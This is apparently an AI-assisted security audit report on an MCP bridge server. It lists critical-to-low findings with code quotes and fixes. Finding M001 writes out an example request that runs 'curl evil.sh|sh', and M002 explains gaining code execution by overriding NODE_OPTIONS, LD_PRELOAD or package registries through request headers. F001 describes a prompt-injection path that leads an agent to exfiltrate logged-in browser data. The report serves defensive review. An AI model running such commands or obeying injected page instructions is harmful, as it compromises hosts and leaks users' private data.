# Agent & MCP security report

Scanned: `/tmp/blind/c08` · 2026-11-23T20:35:34+00:00 · auditor v1.0.0 · mode: reviewed

## Verdict: 🔴 Fix before shipping

| Critical | High | Medium | Low | Info | Dismissed as false alarm | Needs context |
|---|---|---|---|---|---|---|
| 2 | 2 | 5 | 4 | 0 | 2 | 0 |

## What was checked

- MCP servers in config files: **6** · tools found in code: **0** · agent/MCP code files: **3** · agent instruction files: **0**
- Frameworks seen: mcp, modelcontextprotocol

## Findings

### M001 · CRITICAL · /bridge spawns any command (and connects to any URL) taken from the HTTP request body
`None:None` · ASI05 Unexpected Code Execution

POST /bridge with {"serverPath":"bash","args":["-c","curl evil.sh|sh"],"env":{...},"method":"ping","params":{}} runs an arbitrary program with arbitrary args/env on the host; an http(s)/ws URL instead makes the bridge connect to any internal address (SSRF). Only the optional shared bearer token stands in front of it.
> `src/server/http-server.ts:194` — `const { serverPath, method, params, args, env } = req.body;`
> `src/server/http-server.ts:227` — `clientId = await this.mcpClient.createClient(serverPath, args, env);`
> `src/client/mcp-client-manager.ts:69` — `command: serverPath,`

**Fix:** Remove free-form serverPath/args/env: let /bridge reference only server ids from mcp-servers.json (like /mcp/:serverId), or allowlist exact commands and reject request-supplied env.

### M002 · CRITICAL · X-MCP-ENV-* request headers override the environment of configured servers
`None:None` · ASI05 Unexpected Code Execution

Any header X-MCP-ENV-<NAME> becomes an environment variable of the spawned npx/uvx server with no allowlist, so a caller of /mcp/:serverId can set NODE_OPTIONS (--import a data: module), NPM_CONFIG_REGISTRY / UV_INDEX_URL (install an attacker package for the unpinned @latest servers), PATH or LD_PRELOAD and get code execution, or override operator-set secrets such as N8N_API_URL to redirect credentials.
> `src/server/http-server.ts:383` — `overrides[envKey] = value;`
> `src/server/http-server.ts:457` — `...headerEnvOverrides,`
> `src/stream/stream-session.ts:46` — `env: mergedEnv,`

**Fix:** Accept only an explicit per-server allowlist of overridable variable names (e.g. N8N_API_KEY) and never allow NODE_OPTIONS, PATH, LD_*, NPM_CONFIG_*, UV_*, PYTHON*.

### M003 · HIGH · Bearer token is optional and the server listens on all interfaces (optionally via ngrok)
`None:None` · ASI03 Identity and Privilege Abuse

With AUTH_TOKEN/ACCESS_TOKEN empty (the .env.example default) every request passes, the app binds all interfaces, and --tunnel publishes it through ngrok, so anyone who can reach it gets M001/M002 code execution; the Origin check is skipped when ALLOWED_ORIGINS is empty, leaving browsers/DNS rebinding open too.
> `src/server/http-server.ts:42` — `this.logger.warn('No AUTH_TOKEN environment variable set. This is a security risk.');`
> `src/server/http-server.ts:118` — `if (this.accessToken) {`
> `src/server/http-server.ts:281` — `const server = this.app.listen(this.config.server.port, async () => {`

**Fix:** Refuse to start without a strong token, bind 127.0.0.1 by default, compare tokens with crypto.timingSafeEqual, and always validate Origin/Host for localhost use.

### F001 · HIGH · TOXIC-FLOW
`mcp-servers.json:1` · ASI01 / ASI02 (untrusted input + private data + way out)

The bridge exposes fetch (untrusted web text and a way out) together with two servers driving the same non-isolated headful Chrome over CDP (logged-in sessions = private data), and the bridge adds no approval step; an injected instruction in a fetched page can make the agent read a logged-in site and send it out via fetch or navigation.
> `mcp-servers.json:5` — `"args": ["mcp-server-fetch"],`
> `mcp-servers.json:13` — `"--isolated=false",`
> `mcp-servers.json:26` — `"--cdp-endpoint=http://127.0.0.1:9222/"`

**Fix:** Run the browser with an isolated, logged-out profile (--isolated=true), split fetch and browser servers across different agents, and require human approval for navigation/fetch to non-allowlisted hosts.

### M004 · MEDIUM · E2B deploy exposes noVNC of the headful browser without a password by default
`None:None` · ASI03 Identity and Privilege Abuse

When VNC_PASSWORD is unset x11vnc runs with -nopw and nginx publishes noVNC at /novnc/ on the sandbox's public 443/80 ports without any auth, so anyone with the sandbox URL can watch and control the browser the agent uses.
> `deploy/e2b/startup.sh:346` — `X11VNC_AUTH_OPTS=("-nopw")`
> `deploy/e2b/nginx.conf:32` — `proxy_pass http://127.0.0.1:6080/;`

**Fix:** Require VNC_PASSWORD (fail startup if unset) and put the /novnc/ locations behind the same bearer-token check (auth_request) as the bridge.

### F005 · MEDIUM · UNPINNED-PACKAGE
`mcp-servers.example.json:11` · ASI04 Agentic Supply Chain

@latest is fetched on every start and the server controls a non-isolated (logged-in) Chrome, so a hijacked release gets those sessions.
> `mcp-servers.example.json:11` — `"chrome-devtools-mcp@latest",`

**Fix:** Pin an exact version (chrome-devtools-mcp@x.y.z) and update deliberately.

### F006 · MEDIUM · UNPINNED-PACKAGE
`mcp-servers.example.json:22` · ASI04 Agentic Supply Chain

@latest is fetched on every start and attaches over CDP to the same logged-in Chrome.
> `mcp-servers.example.json:22` — `"@playwright/mcp@latest",`

**Fix:** Pin an exact version (@playwright/mcp@x.y.z).

### F008 · MEDIUM · UNPINNED-PACKAGE
`mcp-servers.json:11` · ASI04 Agentic Supply Chain

Live config: @latest on every start, controlling a non-isolated Chrome with the user's sessions.
> `mcp-servers.json:11` — `"chrome-devtools-mcp@latest",`

**Fix:** Pin an exact version.

### F009 · MEDIUM · UNPINNED-PACKAGE
`mcp-servers.json:22` · ASI04 Agentic Supply Chain

Live config: @latest on every start, attached over CDP to the same Chrome.
> `mcp-servers.json:22` — `"@playwright/mcp@latest",`

**Fix:** Pin an exact version.

### M005 · LOW · Full tool-call arguments logged at INFO
`None:None` · 

Every /bridge tools/call logs its full arguments (and line 195 logs the request body with only env masked), so credentials or personal data passed as tool arguments end up in logs.
> `src/client/mcp-client-manager.ts:128` — `this.logger.info(`Calling tool: ${JSON.stringify(params)}`);`

**Fix:** Log tool name and argument keys only, or redact values at debug level.

### M006 · LOW · n8n-mcp wrapper runs an unpinned npx package with the full server environment
`None:None` · ASI04 Agentic Supply Chain

npx n8n-mcp downloads whatever version is current and receives the whole environment (including AUTH_TOKEN / NGROK_AUTH_TOKEN if set), so a hijacked release gets those secrets.
> `src/server/n8n-mcp-wrapper.ts:8` — `const child = spawn('npx', ['n8n-mcp'], {`
> `src/server/n8n-mcp-wrapper.ts:10` — `env: process.env,`

**Fix:** Pin n8n-mcp@<version> and pass only the variables it needs (N8N_API_URL, N8N_API_KEY).

### F004 · LOW · UNPINNED-PACKAGE
`mcp-servers.example.json:5` · ASI04 Agentic Supply Chain

Example config launches mcp-server-fetch via uvx with no version, so each start can pull new code; the server holds no credentials.
> `mcp-servers.example.json:5` — `"args": ["mcp-server-fetch"],`

**Fix:** Pin the version, e.g. "mcp-server-fetch==<version>".

### F007 · LOW · UNPINNED-PACKAGE
`mcp-servers.json:5` · ASI04 Agentic Supply Chain

Live config launches mcp-server-fetch via uvx unpinned; no credentials held. Note M002: request headers can also redirect the package index.
> `mcp-servers.json:5` — `"args": ["mcp-server-fetch"],`

**Fix:** Pin the version.

## Dismissed as false alarms

- F002 TLS-VERIFY-OFF `deploy/e2b/sandbox_deploy.py:692` — verify=False is only used for an unauthenticated GET /health readiness probe to the self-signed sandbox; no token or data is sent and only the status code is used, so a MITM gains nothing beyond a wrong readiness answer.
- F003 TLS-VERIFY-OFF `deploy/e2b/sandbox_deploy.py:877` — Same keepalive /health probe as F002: no credentials sent, only the status code is read.

## Limits

- Static review: the auditor reads code and configs; it does not run servers or attack them. Logic bugs, auth flaws in other services and runtime behaviour can be missed.
- Tool descriptions are checked as written in the code or a tools/list export; a remote server can return different text at runtime (use `pin --check` on exported tools.json).
- AI-assisted: findings are judged by an AI agent with every quote verified against the code; a human should confirm critical fixes.
